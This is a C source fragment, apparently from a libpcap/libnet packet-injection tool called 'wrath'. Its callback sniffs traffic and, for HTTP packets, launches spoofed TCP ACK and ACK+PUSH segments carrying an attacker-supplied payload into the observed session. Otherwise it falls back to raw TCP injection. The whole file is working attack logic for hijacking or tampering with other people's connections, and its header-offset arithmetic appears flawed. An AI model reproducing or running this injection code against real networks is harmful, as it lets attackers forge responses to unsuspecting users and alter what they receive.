#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"
#include "wrath-builders.h"
#include "wrath-utils.h"

void wrath_build_and_launch(u_char *, const u_char *, u_char *);

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;
	
	/* test for input file:
		if an input file exists, assume it contains all encoding information.
		read the file's data onto the heap.
		present the pointer to wrath_build.
	
	   if an input file does not exist see if an operation does.
	   
	   if an operation does not exist only pass null pointer.
	*/

	/* looks to see if an operation is set.
	 * when operations are set packets are only launched in 
	 * response to packets which share their operations 
	 * protocol */
	char *op = cline_args->operation;
	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) { // HTTP response
		const u_char *http_begin;
		http_begin = packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H);
		if (strstr(http_begin, "HTTP") != NULL) {
			printf("HTTP Packet sniffed\n");
			wrath_tcp_belly_build_and_launch(args, packet, NULL, TH_ACK, strlen(http_begin));
			wrath_tcp_belly_build_and_launch(args, packet, package->payload, (TH_ACK + TH_PUSH), strlen(http_begin));
		}
	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
			wrath_tcp_raw_build_and_launch(args, packet);
}
